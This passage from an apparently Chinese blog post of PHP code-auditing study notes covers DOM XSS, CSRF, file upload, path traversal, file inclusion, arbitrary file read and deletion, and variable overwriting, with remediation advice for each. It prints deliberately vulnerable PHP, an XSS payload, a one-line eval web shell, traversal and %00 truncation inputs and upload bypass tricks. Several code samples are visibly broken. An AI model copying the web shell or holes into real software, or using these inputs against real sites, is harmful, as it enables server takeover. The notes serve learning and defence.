<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284525211.png" alt="1563284525211"></p>
<p>DOM可为存储型，可为反射型</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DOM</span>型<span class="type">XSS</span>其实是一种特殊类型的反射型<span class="type">XSS</span>，它是基于<span class="type">DOM</span>文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的<span class="type">Document</span> <span class="class"><span class="keyword">object</span><span class="title">文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。</span></span></span><br><span class="line"><span class="class"><span class="title">可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</span></span></span><br><span class="line"><span class="class"><span class="title">也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</span></span></span><br></pre></td></tr></table></figure>

<p>修改了HTML内容，从而执行了XSS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$xss = $_GET[<span class="string">'XSS'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $xss;?&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ?xss = <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span> = <span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改后：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror = alert(/xss/)&gt;"</span> <span class="attr">type</span> =<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span> = <span class="string">"alert(/xss/)"</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DOM-XSS 的 数据流向是： URL–&gt;浏览器</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS的防御方法：DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（<span class="number">1</span>） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</span><br><span class="line">（<span class="number">2</span>） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。</span><br><span class="line">https:<span class="regexp">//</span>www.jianshu.com<span class="regexp">/p/</span><span class="number">190</span>dedd585f2</span><br></pre></td></tr></table></figure>

<p>XSS修复方案</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对所有输入中的<span class="keyword">script</span>、iframe等字样进行严格的检查</span><br><span class="line"></span><br><span class="line">验证数据的类型及其格式、长度、范围和内容</span><br><span class="line"></span><br><span class="line">客户端做数据的验证与过滤，关键的过滤步骤在服务端进行</span><br><span class="line"></span><br><span class="line">检查输出的数据</span><br></pre></td></tr></table></figure>

<h3 id="CSRF漏洞（最容易被忽略）"><a href="#CSRF漏洞（最容易被忽略）" class="headerlink" title="CSRF漏洞（最容易被忽略）"></a>CSRF漏洞（最容易被忽略）</h3><p>跨站请求伪造。</p>
<p>黑客伪造用户的HTTP请求，将这个请求发送给存在CSRF的网站，有CSRF的网站执行了伪造的HTTP请求，就引发了跨站请求伪造。</p>
<p>漏洞危害</p>
<p>攻击者盗用你的身份信息，以你的名义发送恶意请求，发送邮件、消息，盗取账号，购买商品，虚拟货币转账。        -&gt;个人隐私泄露和财产安全。</p>
<p>漏洞本质</p>
<p>攻击者获取到重要参数，成功构造一个伪造请求</p>
<p>挖掘思路</p>
<p>后台功能模块：管理后台，会员中心、添加用户</p>
<p>被引用的核心文件里没有验证token和referer相关的代码</p>
<p>没有token：可以直接请求这个页面</p>
<p>没带referer：返回相同的数据</p>
<p>任意用户注册代码案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标存在CSRF漏洞</span><br><span class="line">受害者需要保持目标站点的活跃状态</span><br><span class="line">受害者需要点击钓鱼链接</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(admin,$conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GB2332"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;用户登录&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击登录"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"illegal"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE usename="</span>$usename<span class="string">" and password="</span>$usename<span class="string">";</span></span><br><span class="line"><span class="string">$result = mysql_query($sql) or die("</span>fail<span class="string">",mysql_error());</span></span><br><span class="line"><span class="string">if($row = mysql_fetch_array($result))&#123;</span></span><br><span class="line"><span class="string">	session_start();</span></span><br><span class="line"><span class="string">	$_SESSION['usename']=$row['usename'];</span></span><br><span class="line"><span class="string">	echo $_SESSION['usename']."</span> welcome!<span class="string">";</span></span><br><span class="line"><span class="string">	echo '&lt;a href="</span>register<span class="string">"&gt;添加用户&lt;/a&gt;'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;会员注册&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            注册用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点用户添加"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'usename'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>请登录用户<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>)</span><br><span class="line">$sql = <span class="string">"INSERT INTO admin(username,password) VALUES($usename,$password)"</span>;</span><br><span class="line"><span class="keyword">if</span>($res_insert)&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>fail<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>success<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录后才能注册，抓包，生成CSRF，保存，发给管理员，（管理员是已登录状态，所以可以注册），管理员点击，带着自己的cookie，成功的注册了一个你想要的账号。</p>
<p>修复方案：</p>
<p>验证码</p>
<p>添加Referer验证        页面逻辑</p>
<p>添加Token验证（放入cookie中）        真随机算法生成器，以致攻击者无法构造完整的url，</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务器命令的能力。问题在于服务器怎么处理、解释文件。</p>
<p>漏洞条件：</p>
<p>文件可上传</p>
<p>文件上传路径</p>
<p>文件可被访问、执行</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563348454917.png" alt="1563348454917"></p>
<p>挖掘思路：</p>
<p>上传调用同一个上传类，直接全局搜索上传函数</p>
<p>黑盒寻找上传点，代码定位</p>
<p>代码案例</p>
<p>name：客户端的原始上传文件名称</p>
<p>Type： 上传文件的MIME类型</p>
<p>Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
<p>Error：上传文件时的错误信息</p>
<p>Size：上传文件的大小，单位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8&quot;);</span><br><span class="line">$upload_dir = &quot;E:\Local test\WWW\upload&quot;;</span><br><span class="line">if(!isset($_FILES[&apos;file&apos;])&#123;</span><br><span class="line">    $upload_name = $upload_dir.&quot;\\&quot;.$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    move_upload_file($_FILES[&apos;file&apos;][&apos;temp_name&apos;]，$upload_name);</span><br><span class="line">    echo &quot;Type: &quot;.$_FILE[&apos;file&apos;][&apos;type&apos;].&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;Size: &quot;.($_FILE[&apos;file&apos;][&apos;size&apos;]/1024).&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;name: &quot;.($_FILE[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;</span><br><span class="line">              &lt;title&gt;Tilte&lt;/head&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">        &lt;form action =&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;input type =&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot;name=&quot;4096&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">@<span class="keyword">eval</span>($_POST[<span class="string">'c'</span>]);</span></span><br><span class="line"><span class="php">&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件上传绕过-客户端</p>
<p>1.将form表单中的onsubmit事件删除</p>
<p>2.拦截数据包，修改拓展名</p>
<p>文件上传绕过-服务端</p>
<p>1.黑白名单过滤</p>
<p>2.修改MIME乐行</p>
<p>3.截断上传攻击</p>
<p>4..htaccess文件攻击</p>
<p>5.目录验证</p>
<p>修复方案</p>
<p>1.检测文件上传内容，黑白名单验证，检测文件拓展名</p>
<p>​                                    MIME验证，检测文件的MIME类型</p>
<p>2.限制文件大小</p>
<p>3.更改临时文件夹的路径</p>
<p>4.读取上传文件的绝对路径与文件名称  过滤./    ../， 目录穿越</p>
<p>5.隐藏文件路径，文件名随机</p>
<h3 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h3><p>文件操作漏洞    </p>
<ol>
<li>文件上传</li>
<li>目录穿越</li>
<li>文件包含</li>
<li>文件读取</li>
<li>文件下载以及删除</li>
</ol>
<p>目录穿越：在Web应用程序所在的根目录以外的文件夹上，任意的存取被限制的文件夹、执行命令或查找数据，目录穿越攻击。</p>
<p>代码案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">"file/"</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="number">1</span>.txt</span><br><span class="line"><span class="meta">&gt;&gt;</span>?file=../<span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p>绕过方式</p>
<p>URL编码，16位Unicode编码，双倍URL编码，超长UTF-8 Unicode编码</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563354832317.png" alt="1563354832317"></p>
<p>修复方案：</p>
<ol>
<li>在URL内不要使用文件名作为参数</li>
<li>检查文件名是否有..</li>
<li>在php.ini文件中设置open_basedir来制定文件的目录</li>
<li>使用realpath函数来展开文件路劲中的”./“,”../“等字符，然后返回绝对路径名称</li>
<li>使用basename函数来返回不包含路径的文件名称</li>
</ol>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>由于传入的文件名没有经过合理的校验，导致意外的文件泄露甚至代码注入</p>
<p>危害</p>
<p>执行恶意代码</p>
<p>包含恶意文件控制网站、网站服务器</p>
<p>本地包含    LFI</p>
<p>包含本机文件，该漏洞允许攻击者操纵输入数据、注入路径遍历字符。包含web服务器的其他文件</p>
<p>远程包含    RFI</p>
<p>远程文件包含需要设置allow_url_include =On 四个文件都支持HTTP、FTP等协议，</p>
<p>挖掘思路</p>
<p>模块加载、cache调用，传入的参数拼接包含路径</p>
<p>include()</p>
<p>include_once()</p>
<p>require()</p>
<p>require_once()</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563355377723.png" alt="1563355377723"></p>
<p>本地文件包含</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=../<span class="built_in">file</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>远程文件包含</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="symbol">http:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>文件名拓展名被写死，可以用%00截断，（1.jpg%00.php）</p>
<p>远程包含利用方式</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563356062805.png" alt="1563356062805"></p>
<p>修复方案</p>
<p>关闭远程包含参数开关</p>
<p>allow_url_include =Off</p>
<p>设置类似白名单的方法，筛选固定文件名</p>
<p>常见目录穿越字符进行过滤，若”./“,”../“,”..&quot;</p>
<p>觉着还可以过滤一下 %00 这个危险截断符    （但是\x00的截断在php&gt;5.3.4就没用了，）</p>
<h3 id="任意文件读取以及删除（修改）"><a href="#任意文件读取以及删除（修改）" class="headerlink" title="任意文件读取以及删除（修改）"></a>任意文件读取以及删除（修改）</h3><p>正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563367306026.png" alt="1563367306026"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($filename))&#123;</span><br><span class="line"><span class="number">1.</span>  readfile($filename);		<span class="comment">//目录穿越一波？</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>  $fp = fopen($filename,mode=<span class="string">'r'</span>) <span class="keyword">or</span> (<span class="string">"fail"</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;					<span class="comment">//感觉跟文件包含差不多23333,文件包含是利用，文件读取就读内容</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>  <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以将路劲遍历序列放入文件名内，从当前位置向上回溯，从而浏览整个浏览器的任何文件</p>
<p>任意文件删除</p>
<p>unlink()函数</p>
<p>同任意文件读取，函数不同而已。</p>
<p>修复方案：</p>
<ol>
<li><p>正则严格判断用户输入参数的格式</p>
</li>
<li><p>检查使用者的文件名是否有“..”的目录阶层字符</p>
</li>
<li><p>在php.ini文件中设置open_basedir来限定文件访问的范围</p>
</li>
</ol>
<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>结合其他漏洞攻击，覆盖白名单，控制没覆盖的未初始化变量导致SQL</p>
<p>常见危险函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">extract</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parse_str</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">import_request_variables</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>常见的遍历方式释放代码可能导致变量覆盖漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</span><br><span class="line">		$$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>前提：register_globals = Off，（？为啥这么要求嘞，待解决）</p>
<p>extract()变量覆盖</p>
<p>int extract($array,extract_rules,prefix)</p>
<p>$array 关联的数组，受后面参数影响</p>
<p>extract_rules 对待非法/数字和冲突的键名的方法将根据取除标记</p>
<p>prefix 仅在第二个参数特殊时需要，添加前缀</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563369370804.png" alt="1563369370804"></p>
